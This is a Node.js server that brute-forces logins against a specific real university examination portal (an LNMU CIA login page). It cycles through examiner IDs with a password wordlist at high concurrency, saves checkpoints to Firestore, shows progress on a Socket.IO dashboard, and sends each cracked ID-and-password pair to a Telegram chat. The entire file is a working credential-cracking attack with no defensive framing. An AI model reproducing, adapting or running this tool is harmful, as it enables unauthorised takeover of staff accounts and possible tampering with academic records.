require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const admin = require('firebase-admin');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// ========== CONFIG ==========
const PORT = process.env.PORT || 3000;
const LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';
const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 20;   // parallel requests per batch
const CHECKPOINT_INTERVAL = 500;   // after how many passwords save checkpoint

// ========== FIREBASE (optional) ==========
let db = null;
let bot = null;
try {
  if (process.env.FIREBASE_CREDENTIALS_BASE64) {
    const decoded = Buffer.from(process.env.FIREBASE_CREDENTIALS_BASE64, 'base64').toString('utf8');
    const serviceAccount = JSON.parse(decoded);
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
    db = admin.firestore();
    console.log('✅ Firebase connected');
  }
} catch (err) { console.log('⚠️ Firebase not configured'); }

if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
  console.log('✅ Telegram ready');
}

// ========== EXPRESS & SOCKET.IO ==========
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
app.use(express.static('public'));

// ========== GLOBAL STATE ==========
let isRunning = false;
let isPaused = false;
let examinerIds = [];
let passwords = [];           // full password list in memory
let totalExaminers = 0;
let currentExaminerIndex = 0;
let currentPasswordIndex = 0;
let successes = new Map();    // examinerId -> password
let speedStats = { attempts: 0, startTime: null };

// Reusable axios instance with keep-alive
const axiosInstance = axios.create({
  timeout: 5000,
  headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' },
  httpAgent: new (require('http').Agent)({ keepAlive: true }),
  httpsAgent: new (require('https').Agent)({ keepAlive: true })
});

// ========== LOAD FILES ==========
function loadExaminers() {
  const fullPath = path.resolve(EXAMINER_FILE);
  if (!fs.existsSync(fullPath)) {
    fs.writeFileSync(fullPath, JSON.stringify(['EC1032506'], null, 2));
  }
  const data = fs.readFileSync(fullPath, 'utf8');
  examinerIds = JSON.parse(data);
  totalExaminers = examinerIds.length;
  console.log(`✅ ${totalExaminers} examiners loaded`);
}

function loadPasswords() {
  const fullPath = path.resolve(PASSWORD_FILE);
  if (!fs.existsSync(fullPath)) {
    fs.writeFileSync(fullPath, 'admin123\npassword\n');
  }
  const content = fs.readFileSync(fullPath, 'utf8');
  passwords = content.split(/\r?\n/).filter(l => l.trim().length > 0);
  console.log(`✅ ${passwords.length} passwords loaded (${(content.length/1024/1024).toFixed(2)} MB)`);
}

// ========== CHECKPOINT ==========
async function saveCheckpoint() {
  if (!db) return;
  try {
    await db.collection('checkpoint').doc('current').set({
      examinerIndex: currentExaminerIndex,
      passwordIndex: currentPasswordIndex,
      successes: Array.from(successes.entries()),
      updatedAt: admin.firestore.FieldValue.serverTimestamp(),
      status: isPaused ? 'paused' : 'running'
    }, { merge: true });
  } catch (err) { console.error('Checkpoint save error:', err.message); }
}

async function loadCheckpoint() {
  if (!db) return;
  try {
    const doc = await db.collection('checkpoint').doc('current').get();
    if (doc.exists) {
      const data = doc.data();
      currentExaminerIndex = data.examinerIndex || 0;
      currentPasswordIndex = data.passwordIndex || 0;
      if (data.successes) {
        for (const [id, pwd] of data.successes) successes.set(id, pwd);
      }
      console.log(`📌 Resume: examiner ${currentExaminerIndex}, password #${currentPasswordIndex}`);
    }
  } catch (err) {}
}

async function loadExistingSuccesses() {
  if (!db) return;
  const snapshot = await db.collection('successful_logins').get();
  snapshot.forEach(doc => {
    const { examinerId, password } = doc.data();
    successes.set(examinerId, password);
  });
  console.log(`📦 Loaded ${successes.size} previous successes`);
}

// ========== LOGIN ATTEMPT ==========
async function tryLogin(examinerId, password) {
  try {
    const res = await axiosInstance.post(LOGIN_URL, {
      loginType: LOGIN_TYPE,
      userid: examinerId,
      password: password
    });
    speedStats.attempts++;
    return { success: !res.data.includes('Invalid'), password };
  } catch (err) {
    speedStats.attempts++;
    return { success: false };
  }
}

// ========== PROCESS ONE EXAMINER (BATCH CONCURRENCY) ==========
async function processExaminer(examinerId, startPwdIdx) {
  let foundPassword = null;
  let pwdIdx = startPwdIdx;
  const total = passwords.length;
  
  while (pwdIdx < total && !foundPassword && isRunning && !isPaused) {
    const batch = passwords.slice(pwdIdx, pwdIdx + CONCURRENCY);
    const promises = batch.map(pwd => tryLogin(examinerId, pwd));
    const results = await Promise.all(promises);
    
    for (let i = 0; i < results.length; i++) {
      if (results[i].success) {
        foundPassword = results[i].password;
        break;
      }
    }
    pwdIdx += batch.length;
    currentPasswordIndex = pwdIdx;
    
    // Update progress and checkpoint occasionally
    if (pwdIdx % CHECKPOINT_INTERVAL === 0 || pwdIdx >= total) {
      const elapsed = (Date.now() - speedStats.startTime) / 1000;
      const speed = elapsed > 0 ? Math.round(speedStats.attempts / elapsed) : 0;
      io.emit('progress', {
        examinerIndex: currentExaminerIndex,
        totalExaminers,
        passwordIndex: pwdIdx,
        totalPasswords: total,
        currentExaminer: examinerId,
        speed
      });
      await saveCheckpoint();
    }
  }
  return { found: !!foundPassword, password: foundPassword };
}

// ========== MAIN ATTACK LOOP ==========
async function startAttack() {
  if (isRunning || passwords.length === 0) return;
  isRunning = true;
  isPaused = false;
  speedStats.attempts = 0;
  speedStats.startTime = Date.now();
  io.emit('status', { running: true, paused: false });
  console.log('🚀 Attack started');

  for (let idx = currentExaminerIndex; idx < totalExaminers && isRunning && !isPaused; idx++) {
    const examinerId = examinerIds[idx];
    if (successes.has(examinerId)) continue;
    currentExaminerIndex = idx;
    const result = await processExaminer(examinerId, currentPasswordIndex);
    
    if (result.found) {
      successes.set(examinerId, result.password);
      io.emit('success', { examinerId, password: result.password, time: new Date().toISOString() });
      if (db) await db.collection('successful_logins').add({ examinerId, password: result.password, timestamp: admin.firestore.FieldValue.serverTimestamp() });
      if (bot) await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `✅ ${examinerId} : ${result.password}`);
    }
    currentPasswordIndex = 0;
    await saveCheckpoint();
  }
  isRunning = false;
  await saveCheckpoint();
  io.emit('status', { running: false, paused: false });
  console.log('🏁 Attack finished');
}

// ========== SOCKET.IO ==========
io.on('connection', (socket) => {
  socket.emit('init', {
    totalExaminers,
    successes: Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd })),
    currentExaminerIndex,
    currentPasswordIndex,
    totalPasswords: passwords.length,
    isRunning,
    isPaused
  });
  socket.on('start', () => startAttack());
  socket.on('pause', async () => { if (isRunning) { isPaused = true; isRunning = false; await saveCheckpoint(); io.emit('status', { running: false, paused: true }); } });
  socket.on('resume', () => startAttack());
  socket.on('stop', async () => { isRunning = false; isPaused = false; currentExaminerIndex = 0; currentPasswordIndex = 0; successes.clear(); await saveCheckpoint(); io.emit('init', { totalExaminers, successes: [], currentExaminerIndex: 0, currentPasswordIndex: 0, totalPasswords: passwords.length, isRunning: false, isPaused: false }); });
});

// ========== START SERVER ==========
loadExaminers();
loadPasswords();
(async () => {
  await loadExistingSuccesses();
  await loadCheckpoint();
  server.listen(PORT, () => {
    console.log(`🔥 Server at http://localhost:${PORT}`);
    console.log(`⚡ Concurrency: ${CONCURRENCY} requests/batch`);
    console.log(`💾 Memory: ${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} MB`);
  });
})();
